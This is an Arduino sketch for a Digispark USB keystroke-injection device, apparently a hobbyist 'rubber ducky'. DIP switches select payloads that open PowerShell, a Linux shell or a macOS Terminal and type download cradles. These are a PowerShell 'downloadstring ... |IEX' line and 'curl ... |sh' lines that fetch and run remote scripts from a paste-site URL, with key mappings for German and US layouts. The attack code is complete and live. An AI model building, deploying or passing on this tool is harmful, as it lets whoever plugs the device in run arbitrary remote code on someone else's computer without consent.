#include <DigiKeyboard.h>

int dips[] = {2,1,0};
const char shift[] = {'?',';','!','"','§','$','%','&','/','(',')','=',':','*','_','\'','>','Z','Y',0};
const char shift_keys[] = {45,54,KEY_1,KEY_2,KEY_3,KEY_4,KEY_5,KEY_6,KEY_7,KEY_8,KEY_9,KEY_0,55,48,56,49,100,KEY_Y,KEY_Z,0};
const char alt[] = {'{','[',']','}','\\','|',0};
const char alt_keys[] = {KEY_7,KEY_8,KEY_9,KEY_0,45,100,0};
const char norms[] = {'+','-','#','<','z','y',0};
const char norms_keys[] = {48,56,49,100,KEY_Y,KEY_Z,0};

const char WinPScradle[] = "(new-object system.net.webclient).downloadstring('https://bpa.st/raw/6LDQ')|IEX";
const char LinuxCurlcradle[] = "curl https://bpa.st/raw/QSCA|sh";
const char MacOSXCurlcradle[] = "curl https://bpa.st/raw/QSCA";

void printcDE(char c){
    char k1 = 0;
    char k2 = 0;
    int i;
    for(i=0; shift[i] != 0; i++){
        if(c == shift[i]){
            k1 = shift_keys[i];
            k2 = MOD_SHIFT_LEFT;
        }
    }
    if(k1 == 0){
        for(i=0; alt[i] != 0; i++){
          if(c == alt[i]){
              k1 = alt_keys[i];
              k2 = MOD_ALT_RIGHT;
          }
        }
    }
    if(k1 == 0){
        for(i=0; norms[i] != 0; i++){
          if(c == norms[i]){
            k1 = norms_keys[i];
          }
        }
    } else {
        DigiKeyboard.sendKeyStroke(k1,k2);
        return;
    }
    if(k1 == 0){
      DigiKeyboard.print(c);
    } else {
      DigiKeyboard.sendKeyStroke(k1);
    }
}


void printDE(const char *s){
  for(int i=0; s[i] != 0; i++){
    printcDE(s[i]);   
  }
}

void printDEln(const char *s){
  printDE(s);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void printLn(const char* s){
    DigiKeyboard.print(s);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void winr(){
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
}

void ps(){
  winr();
  printLn("powershell");
  DigiKeyboard.delay(300);
}

void macTerm(){
  DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_GUI_LEFT);
  printLn("terminal");
  DigiKeyboard.delay(300);
}
void p0() {
 //reserved
}
void p1() {
  // start overthewire in browser
  winr();
  printLn("www.overthewire.org");
}
void p2() {
  // DE layout Windows Powershell cradle ("(new-object system.net.webclient).downloadstring('https://bpa.st/raw/6LDQ')|IEX")
  ps();
  printDEln(WinPScradle);
}
void p3() {
  // US layout Windows Powershell cradle ("(new-object system.net.webclient).downloadstring('https://bpa.st/raw/6LDQ')|IEX")
  ps();
  printLn(WinPScradle);
}

void p4() {
  //DE Layout Linux curl cradle, open terminal manually first ("curl https://bpa.st/raw/QSCA|sh")
  printDEln(LinuxCurlcradle);
}
void p5() {
  //US Layout Linux curl cradle, open terminal manually first ("curl https://bpa.st/raw/QSCA|sh")
  printLn(LinuxCurlcradle);
}
void p6() {
  //DE Mac OS X curl cradle ("curl https://bpa.st/raw/QSCA|sh")
  macTerm();
  printDE(MacOSXCurlcradle);
  DigiKeyboard.sendKeyStroke(KEY_7,MOD_ALT_RIGHT); // '|'
  printLn("sh");

}
void p7() {
  //US Mac OS X curl cradle ("curl https://bpa.st/raw/QSCA|sh")
  macTerm();
  DigiKeyboard.print(MacOSXCurlcradle);
  DigiKeyboard.sendKeyStroke(KEY_7,MOD_ALT_RIGHT); // '|'
  printLn("sh");
}

void (*p[8])() = {p0, p1, p2, p3, p4, p5, p6, p7};
void setup(){
  int pi = 0;
  for(int i = 0; i<3; ++i){
    pinMode(dips[i],INPUT_PULLUP); // setup switches as input 
    if(digitalRead(dips[i]) == LOW){
      pi = pi | (1 << i); // state of switches
    }
  }
  DigiKeyboard.sendKeyStroke(0); // setup keyboard
  DigiKeyboard.delay(300);
  p[pi](); // execute payload
}

void loop() {
}
